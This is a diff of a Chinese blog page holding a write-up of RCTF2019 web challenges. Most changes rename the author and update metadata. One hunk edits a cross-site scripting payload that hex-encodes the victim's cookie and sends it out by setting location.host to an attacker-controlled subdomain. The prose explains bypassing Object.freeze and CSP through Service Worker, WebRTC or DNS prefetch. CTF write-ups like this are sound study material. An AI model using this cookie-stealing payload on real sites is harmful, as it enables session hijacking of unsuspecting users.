@@ -84,7 +84,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="RCTF2019 web wp">
 <meta property="og:url" content="http://yoursite.com/2019/07/20/RCTF2019-web-wp/index.html">
-<meta property="og:site_name" content="shifeng_kazeの家">
+<meta property="og:site_name" content="k0t0r1の家">
 <meta property="og:description" content="复现这个环境真的要命，真的是整几天docker做一天题Orz">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/3c24a73a416975aef3223f3ed75a6948.png">
@@ -95,7 +95,7 @@
 <meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/7e6b6c53be81dd685cbc541c61bc728d.png">
 <meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/fc12c4d5ce09aa94cac0810e8791b882.png">
 <meta property="og:image" content="http://shifeng-kaze.cn/blog/RCTF2019_web_wp/f63f7f702d11ef2b49decaa46e001ff4.png">
-<meta property="og:updated_time" content="2019-08-01T16:06:43.272Z">
+<meta property="og:updated_time" content="2019-11-06T05:50:14.496Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="RCTF2019 web wp">
 <meta name="twitter:description" content="复现这个环境真的要命，真的是整几天docker做一天题Orz">
@@ -135,7 +135,7 @@
 
 
 
-  <title>RCTF2019 web wp | shifeng_kazeの家</title>
+  <title>RCTF2019 web wp | k0t0r1の家</title>
   
 
 
@@ -165,7 +165,7 @@
     <div class="custom-logo-site-title">
       <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">shifeng_kazeの家</span>
+        <span class="site-title">k0t0r1の家</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
@@ -245,13 +245,13 @@
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/20/RCTF2019-web-wp/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="shifeng_kaze">
+      <meta itemprop="name" content="k0t0r1">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="http://shifeng-kaze.cn/blog/head/kotori.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="shifeng_kazeの家">
+      <meta itemprop="name" content="k0t0r1の家">
     </span>
 
     
@@ -351,7 +351,7 @@
 <p>先说绕freeze()</p>
 <p>绕过freeze()好像属于非预期解，这里虽然freeze()冻结了<code>document.location</code>，但用<code>location.host</code>却可以被修改<br>找了下资料大概就是说freeze()会让对象不可拓展，同时将configurable和writable 属性设为false。<br>当configurable为false时，对象属性特性无法更改且无法删除属性；当writable 为false则不能更改属性值。<br>而由于href的writable 值被设为了false因此自然就不能修改，但host和hostname并没有writable特性，这两个属性的赋值与取值是通过setter和getter完成的，这就是能够修改host的原因</p>
 <p>有一个能跳转的就好办，上一波payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">navigator.serviceWorker.register(&apos;/uploads/5b4db31f15c389f1a3866972e0e7b8c2.js?&apos;+encodeURIComponent(document.cookie),&#123;scope: &apos;/uploads/&apos;&#125;);</span><br><span class="line">function stringToHex(str)&#123;</span><br><span class="line">	var val=&quot;&quot;;</span><br><span class="line">	for(var i = 0; i &lt; str.length; i++)&#123;</span><br><span class="line">		if(val == &quot;&quot;)</span><br><span class="line">			val = str.charCodeAt(i).toString(16);</span><br><span class="line">		else</span><br><span class="line">			val += str.charCodeAt(i).toString(16);</span><br><span class="line">	&#125;</span><br><span class="line">	return val;</span><br><span class="line">&#125;</span><br><span class="line">location.host=stringToHex(document.cookie).substr(0,60)+&quot;.域名:80&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function stringToHex(str)&#123;</span><br><span class="line">	var val=&quot;&quot;;</span><br><span class="line">	for(var i = 0; i &lt; str.length; i++)&#123;</span><br><span class="line">		if(val == &quot;&quot;)</span><br><span class="line">			val = str.charCodeAt(i).toString(16);</span><br><span class="line">		else</span><br><span class="line">			val += str.charCodeAt(i).toString(16);</span><br><span class="line">	&#125;</span><br><span class="line">	return val;</span><br><span class="line">&#125;</span><br><span class="line">location.host=stringToHex(document.cookie).substr(0,60)+&quot;.域名:80&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 <p>这里由于是修改host，所以不能通过get传参过去，只能通过不同级的域名发送过去。如果是用自己服务器接的记得要配二级以上的域名，不然会接不到。同时由于这个搭环境时默认是搭在12315端口上，所以不能用hostname，必须用host指定80端口（这里坑了我好久，不过还是因为bot没反应还是没打出来）</p>
 <p>然后是绕过CSP。绕过CSP则有三种方法，一种是使用Service Worker，另一种是用WebRTC,还有一种是DNS-prefetch</p>
 <p>首先什么是Service Worker，Service Worker可以看作是一个远程缓存的接口，起离线依旧保持用户的缓存状态等作用。<br>而Service Worker有一个特点，在Service Worker执行js代码时，会遵从的是这个js的CSP。<br>不过在注册Service Worker时会受到<code>worker-src</code>与<code>script-src</code>，在存在<code>worker-src</code>时，若设为<code>self</code>则可以注册，而不存在时则看<code>script-src</code>。<br>还有作为Service Worker的服务器必须通过https进行数据交互</p>
@@ -568,9 +568,9 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
-              <img class="site-author-image" itemprop="image" src="http://shifeng-kaze.cn/blog/head/kotori.jpg" alt="shifeng_kaze">
+              <img class="site-author-image" itemprop="image" src="http://shifeng-kaze.cn/blog/head/kotori.jpg" alt="k0t0r1">
             
-              <p class="site-author-name" itemprop="name">shifeng_kaze</p>
+              <p class="site-author-name" itemprop="name">k0t0r1</p>
               <p class="site-description motion-element" itemprop="description">～いらっしゃいません～</p>
           </div>
 
@@ -581,7 +581,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -669,7 +669,7 @@
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">shifeng_kaze</span>
+  <span class="author" itemprop="copyrightHolder">k0t0r1</span>
 
   
 </div>
